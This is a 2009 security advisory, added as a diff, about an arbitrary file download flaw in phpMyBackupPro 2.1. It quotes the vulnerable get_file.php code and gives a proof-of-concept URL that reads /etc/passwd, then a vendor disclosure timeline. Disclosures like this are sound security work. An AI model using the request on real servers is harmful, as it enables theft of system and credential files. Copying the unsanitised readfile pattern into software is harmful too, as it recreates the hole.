@@ -1,0 +1,71 @@
+################################################################################
+	Arbitrary File Download in phpMyBackupPro
+
+	Name			Arbitrary File Download in phpMyBackupPro
+	Systems Affected	phpMyBackupPro v 2.1 and possibly earlier versions
+	site			http://www.phpmybackuppro.net
+	Author			Amol Naik (amolnaik4[at]gmail.com)
+	Date			16/11/2009
+################################################################################
+
+
+############
+1. OVERVIEW
+############
+
+phpMyBackupPro is a web-based MySQL backup application in PHP. 
+You can schedule backups, download, email or upload them with FTP and backup whole file directories. 
+Zip and gzip compression, easy interface and installation. Many languages and online help!
+
+###############
+2. DESCRIPTION
+###############
+
+phpMyBackupPro is vulnerable to Arbitrary File Download.
+
+######################
+3. TECHNICAL DETAILS
+######################
+
+Arbritrary File Downlaod
+++++++++++++++++++++++++
+
+Vulnerable page		get_file.php
+Vulnerable Parameters	view
+Vulnerable Code		
+
+---------------------------------------------------------------------------------------
+
+// show the requested file
+if (isset($_GET['view']) && file_exists($_GET['view'])) {
+    if (isset($_GET['download'])) {
+        header("Content-Type: application/octet-stream");
+        header("Content-Disposition: attachment; filename=".basename($_GET['view']));
+        readfile($_GET['view']);
+    } else {
+        ......
+        ......
+        .......
+    }
+
+---------------------------------------------------------------------------------------
+
+The parameter "view" is not properly sanitized which results in Arbitrary file download.
+
+++++
+POC
+++++
+
+http://localhost/phpMyBackupPro/get_file.php?download=true&view=/etc/passwd
+
+
+
+############
+4. TimeLine
+############
+
+20th Oct 2009		Bug Discovered
+20th Oct 2009		Reported to Vendor
+27th Oct 2009		vendor agreed to the vulnerablity and ready to fix it.
+16th Nov 2009		No communication received about the status of the fix.
+16th Nov 2009		Public Disclosure
